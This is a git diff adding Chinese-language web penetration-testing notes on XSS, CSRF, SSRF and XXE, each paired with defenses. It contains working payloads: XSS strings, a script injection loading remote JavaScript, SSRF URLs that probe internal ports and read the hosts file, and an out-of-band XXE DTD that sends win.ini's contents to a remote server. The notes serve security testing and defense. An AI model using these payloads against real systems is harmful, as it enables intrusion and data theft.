@@ -356,3 +356,134 @@ file_put_contents($filename,$txt);
 - 限定文件访问范围，如php.ini配置open_basedir为指定目录
 - 对于下载文件的目录做好限制，只能下载指定目录下的文件，或者将要下载的文件存入数据库，附件下载时指定数据库中的id即可
 
+# 跨站脚本攻击（xss）
+
+## 反射性
+
+对提交页面的各个参数依次进行xss注入测试，判定是否存在xss漏洞，如`?phone=176"><script>alert(/xxx/)</script><!--&id=1&name=2`
+
+## 储存型
+
+在页面表单提交过程中，依次对提交参数进行xss测试，常见位置如居住地址，机器人客服。
+
+## 常用测试语句
+
+```html
+'><script>alert(/xxx/)</script><!--
+" onerror=alert(/xxx/) t="
+" onmousemove=alert(/xxx/) t="
+'><img src=123# onerror=alert(1)>
+'><iframe src=http://www.baidu.com><'
+</textarea><script>alert(123)</script><!--		存储型
+```
+
+## DOM型
+
+```html
+'><script>var src=document.createElement('script');src.setAttribute('src','http://169.254.115.76/test.js');document.body.appendChild(src);</script>		远程调用test.jsp:alert(/xss/);脚本
+```
+
+常见位置`http://test.com/index.html?1);var src=document.createElement('script');src.setAttribute('src','http://169.254.115.76/test.js');document.body.appendChild(src);(1`
+
+## 防御方法
+
+- 配置CSP
+- cookie设置http only
+- 对特殊符号进行HTML实体编码`& < > " ' / \ ; [ ] ( )`
+
+# 跨站请求伪造（csrf）
+
+## 检测方式
+
+查看页面对所提交的参数中是否包含唯一性token信息或验证来源页referer头。如果不存在参数，则有csrf漏洞。如果存在参数，删除referer头信息并多次重放，查看是否执行成功，如添加账号、修改个人信息、修改密码、转账，如果成功，则有csrf漏洞。
+
+首先用火狐登录vince账户，抓到修改邮箱的数据包，放到repeater，右键Engagement tools->Generate CSRF POC->test in browser->copy，用谷歌登录allen账户，挂bp代理用谷歌打开复制的网址，Submit request，成功修改allen邮箱为vince邮箱
+
+## 防御方法
+
+- 检测HTTP header中的referer字段，服务器拒绝响应referer不是自己的站点
+- 在重要请求中的每一个url和所有表单中添加token
+- 修改密码等关键操作添加验证码确认
+
+# 服务端请求伪造（ssrf）
+
+## 检测方法
+
+检测页面中的远程请求功能，如远程下载、远程探测、远程加载等功能，在远程地址参数填写内网地址，查看服务器是否有来自测试对象服务器的请求。如果有，则存在ssrf。
+
+通过访问`http://ssrf.com/remote.jsp?url=http://10.10.10.10:80`的响应信息来判断80端口是否开启
+
+通过访问`http://ssrf.com/ssrf_curl.php?url=file://169.254.115.76/C:\Windows\System32\drivers\etc\hosts`来泄露host文件
+
+## 例子
+
+### http代理
+
+`http://www.ssrf.com/proxy/10.0.1.1:8080/`
+
+### 访问内部资源
+
+`http://www.ssrf.com/content.html?contentUrl=http://192.168.20.36:8080`
+
+### PDF
+
+`http://www.ssrf.com/openPDF?file=http://192.168.20.36:8080`
+
+## 防御方法
+
+- 过滤返回信息，如果web应用是获取PDF文件，需在展示给用户之前先验证返回的信息是不是PDF类型
+- 统一错误信息，避免用户可以根据错误信息判断远程服务器的端口状态
+- 限制请求的端口为HTTP常用端口，如80，443，8080，8090
+- 禁止不需要的协议。仅允许HTTP和HTTPS请求，防止file://，gopher://，ftp://
+- 过滤内网ip，限制访问内网资源
+
+# XML外部实体注入（XXE）
+
+## 检测方式-有回显
+
+通常在注册账户，数据更改的位置插入xml测试语句，观察页面响应
+
+```xml
+<?xml version="1.0"?><name>vul!!</name>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>		读取win.ini配置文件
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://whoami">]><root>&xxe;</root>		很难执行命令
+```
+
+### 默认协议
+
+| libxml2 | php            | java    | .net  |
+| ------- | -------------- | ------- | ----- |
+| file    | file           | http    | file  |
+| http    | http           | https   | http  |
+| ftp     | ftp            | ftp     | https |
+|         | php            | file    | ftp   |
+|         | compress.zlib  | jar     |       |
+|         | compress.bzip2 | netdoc  |       |
+|         | data           | mailto  |       |
+|         | glob           | goher * |       |
+|         | phar           |         |       |
+
+### php扩展协议
+
+| scheme                                                       | extension required |
+| ------------------------------------------------------------ | ------------------ |
+| https<br />ftps                                              | openssl            |
+| zip                                                          | zip                |
+| ssh2.shell<br />ssh2.exec<br />ssh2.sftp<br />ssh2.tunnel<br />ssh2.scp | ssh2               |
+| rar                                                          | rar                |
+| ogg                                                          | oggvorbis          |
+| expect                                                       | expect             |
+
+## 检测方式-无回显
+
+将test.dtd放在远程服务器上，远程加载dtd文件:`<!ENTITY % file SYSTEM "file:///c:/windows/win.ini"><!ENTITY % all "<!ENTITY send SYSTEM 'http://169.254.115.76/?%file;'>">%all;`
+
+```xml-dtd
+<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://169.254.115.76/test.dtd"><data>&send;</data>
+```
+
+提交后，观察远程服务器上的访问日志是否存在测试目标的请求，win.ini文件内容以get提交的方式返回到远程服务器上
+
+# 服务器配置缺陷和信息泄露
+
+# 业务逻辑漏洞
